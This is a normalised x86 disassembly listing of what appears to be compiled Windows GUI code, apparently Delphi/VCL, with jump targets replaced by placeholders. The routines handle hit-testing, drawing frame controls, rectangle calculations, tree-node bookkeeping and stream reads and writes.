jg r-xdata
mov edx 0x1
mov eax ebx
call sub_43fac4
add esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov edx 0x2
mov eax ebx
call sub_43fac4
add edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x44 ]
add edx 0xf
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
sub edx 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edx [ eax ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
sub_440938
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_43a870
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_43a834
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov edx [ edi + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ edi ]
sub eax [ ebx + 0x40 ]
lea ecx [ ebp - 0x8 ]
call sub_4123e4
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
jne r-xdata
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4409cc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
push ebp
mov eax [ ebp - 0x4 ]
call sub_440938
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_43ff8c
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebx + 0xa0 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4401d8
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_43ff8c
call sub_44070c
pop ecx
mov eax [ ebp - 0xc ]
mov [ eax ] 0x1
jmp r-xdata
sub_440a54
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_403f6c
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0xc ]
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4045b8
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_440a9c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x8 ]
call sub_44116c
mov eax [ ebp - 0x8 ]
call sub_440168
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edi [ ebp - 0x20 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
mov [ ebp - 0x18 ] eax
xor esi esi
inc edi
mov [ ebp - 0x1c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440c7e
mov eax [ ebp - 0x8 ]
call sub_44016c
retn
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_43f940
mov ebx eax
lea edx [ ebx + 0x10 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebx + 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
push ebp
lea eax [ ebp - 0xc ]
call sub_440a54
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
mov si 0xffb9
call sub_403430
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_43fc60
test al al
jne r-xdata
push ebp
lea eax [ ebp - 0xc ]
call sub_440a54
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_437278
push 0x0
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x10 ]
call sub_438058
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x64 ] ebx
jmp r-xdata
mov eax ebx
call sub_403234
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov [ esi + 0xc ] ebx
mov [ ebx + 0x18 ] esi
mov eax [ esi + 0x14 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov esi ebx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov [ esi + 0x8 ] ebx
mov [ ebx + 0x14 ] esi
jmp r-xdata
mov eax esi
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x14 ]
test edi edi
jle r-xdata
mov [ eax + 0xc ] ebx
mov [ ebx + 0x18 ] eax
mov eax [ eax + 0x14 ]
mov [ ebx + 0x14 ] eax
mov [ ebp - 0x1c ] 0x1
mov eax [ eax + 0x14 ]
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
sub_440ca4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x18 ]
mov eax edi
add eax esi
sub eax 0x2
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx edi
add ecx ebx
sub ecx 0x2
mov edx esi
mov eax ebx
call sub_41240c
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41d1bc
push eax
call DrawFrameControl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_440cfc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000014
call sub_41c724
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx esi
call sub_41ce80
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx edi
call sub_41ce20
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
call sub_41ce20
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_41c724
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx esi
call sub_41ce20
mov ecx ebx
dec ecx
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_41ce20
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_440d84
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
push ebp
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub eax [ edx + 0x18 ]
inc eax
mov edx [ ebx + 0x4 ]
inc edx
call sub_440ca4
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x5
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x3
mov eax [ ebx ]
add eax 0x2
call sub_440cfc
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x8
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x6
mov eax [ ebx ]
add eax 0x2
call sub_440cfc
pop ecx
push ebp
mov edx [ ebx + 0x4 ]
inc edx
mov eax [ ebx ]
inc eax
call sub_440ca4
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x5
add eax 0x3
call sub_440cfc
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x8
add eax 0x6
call sub_440cfc
pop ecx
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_440e60
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cb54
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_435f34
mov eax [ ebp - 0x4 ]
call sub_41ce58
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41d23c
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x14 ]
call sub_43a870
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440f83
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41d23c
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebx + 0xa0 ]
cmp eax [ esi + 0x14 ]
jne r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_43a834
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_436cf8
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x1c ]
sub eax [ ebx + 0x40 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebx + 0x44 ]
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ ebx + 0x48 ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
mov eax [ ebx + 0x4c ]
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
sub eax edx
add eax eax
sub [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_440fc4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx ecx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_43c670
mov edi eax
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
call sub_436da0
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x14 ]
call sub_436d5c
mov ecx eax
xor edx edx
xor eax eax
call sub_41240c
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
test edi edi
jle r-xdata
cmp [ ebx + 0x9c ] 0x0
je r-xdata
push 0x2
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ esi + 0x14 ]
call sub_43db40
push eax
call MapWindowPoints
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al [ ebp + 0xc ]
dec al
je r-xdata
cmp edi 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x48 ]
mov edi eax
mov edx [ ebx + 0x4c ]
mov [ ebp - 0xc ] edx
mov dl [ ebp + 0xc ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
dec eax
sub al 0x2
jae r-xdata
mov edi eax
sar edi 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
sub al 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
sar eax 0x1
jns r-xdata
adc edi 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
sub al 0x2
jne r-xdata
mov [ ebp - 0xc ] eax
adc eax 0x0
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_412434
mov eax [ ebp + 0x8 ]
push esi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
add [ ebp - 0x4 ] edi
jmp r-xdata
sub_441138
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_441138
pop ecx
mov eax ebx
call sub_403234
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_441138
pop ecx
sub_44116c
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
push ebp
call sub_441138
pop ecx
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
cmp ebx [ esi + 0x64 ]
jne r-xdata
mov edx [ ebx + 0x18 ]
mov [ eax + 0x18 ] edx
mov eax ebx
call sub_403234
xor eax eax
mov [ esi + 0x64 ] eax
sub_4411c8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4401d8
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x38 ]
jne r-xdata
mov edx eax
mov eax ebx
call sub_441204
xor edx edx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov [ esi + 0x9c ] 0x0
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_441204
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a6c
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405a6c
mov edx [ ebp - 0x8 ]
pop eax
call sub_404234
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2a0
call sub_4039a8
mov eax [ ebx + 0x14 ]
call sub_43f964
cmp eax 0x1
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405a6c
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405a6c
mov edx [ ebp - 0x10 ]
pop eax
call sub_404234
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2a0
call sub_4039a8
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x64 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x10 ] 0x0
jmp r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax ebx
call sub_403234
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441478
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f90
retn
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebx + 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
call sub_43fd14
jmp r-xdata
mov edi eax
mov edi [ ebx + 0xc ]
jmp r-xdata
mov eax ebx
call sub_43fe8c
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_43fec8
mov eax [ ebx + 0x18 ]
call sub_43fd14
mov [ edx + 0x18 ] eax
push esi
push sub_441a14
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_440240
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x64 ]
jne r-xdata
mov edx [ esi + 0x64 ]
mov eax [ ebx + 0x14 ]
cmp edx eax
jne r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ edi + 0x8 ]
mov [ edx + 0x18 ] eax
test eax eax
jne r-xdata
mov edx [ esi + 0x68 ]
mov eax edi
call sub_43fec8
mov eax [ esi + 0x64 ]
call sub_43fe8c
mov [ esi + 0x68 ] eax
mov eax [ esi + 0x64 ]
call sub_403234
mov [ esi + 0x64 ] edi
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0x14 ] eax
mov eax esi
call sub_4419ec
jmp r-xdata
mov [ eax + 0x10 ] 0x0
mov edx [ edi + 0x4 ]
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_403234
mov eax [ esi + 0x64 ]
mov [ eax + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ esi + 0x64 ]
call sub_43fa10
mov edx eax
mov eax edi
call sub_43feb4
mov eax edi
call sub_43fd14
jmp r-xdata
mov edx [ edi + 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
push esi
push sub_441a14
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_440240
jmp r-xdata
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
push esi
push sub_441a14
mov edx [ eax + 0x14 ]
mov eax esi
call sub_440240
mov eax [ ebx + 0x14 ]
call sub_403234
mov eax edi
call sub_403234
jmp r-xdata
mov edx [ eax + 0xc ]
mov [ edx + 0x18 ] eax
sub_441480
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov esi [ edi + 0x14 ]
test [ esi + 0x1c ] 0x1
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x64 ] 0x0
je r-xdata
mov eax esi
call sub_43c670
test eax eax
jle r-xdata
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
test bl bl
jne r-xdata
push edi
lea esi [ esp + 0x4 ]
add edi 0x1d
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ edi + 0x64 ]
mov dl [ eax + 0x10 ]
dec dl
je r-xdata
lea edx [ edi + 0x1d ]
mov eax esp
mov ecx 0x10
call sub_407ad4
test al al
jne r-xdata
mov edx [ esp + 0x8 ]
sub edx [ esp ]
call sub_43feb4
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x68 ] eax
jmp r-xdata
dec dl
je r-xdata
mov eax [ edi + 0x14 ]
call sub_43c5dc
test eax eax
jle r-xdata
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
call sub_43feb4
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi + 0x68 ] eax
jmp r-xdata
xor edx edx
mov eax edi
call sub_44189c
cmp [ edi + 0x6c ] 0x0
jne r-xdata
push edi
push sub_441a14
xor edx edx
mov eax edi
call sub_440240
sub_44155c
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop edx
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_43fe8c
mov [ esp ] eax
fild [ esp ]
fmul [ esi + 0x40 ]
call sub_402a5c
mov edx eax
mov eax ebx
call sub_43feb4
sub_441598
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_40441c
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40422c
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44160a
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_441610
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x1
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_43fc1c
mov eax [ ebp - 0x8 ]
call sub_441598
pop ecx
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
inc edx
call sub_441610
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4416c6
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
call sub_441610
pop ecx
sub_4416cc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x70 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_43c5dc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx [ ebp - 0xc ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4417bb
mov eax [ ebp - 0x10 ]
call sub_403234
retn
inc ebx
xor esi esi
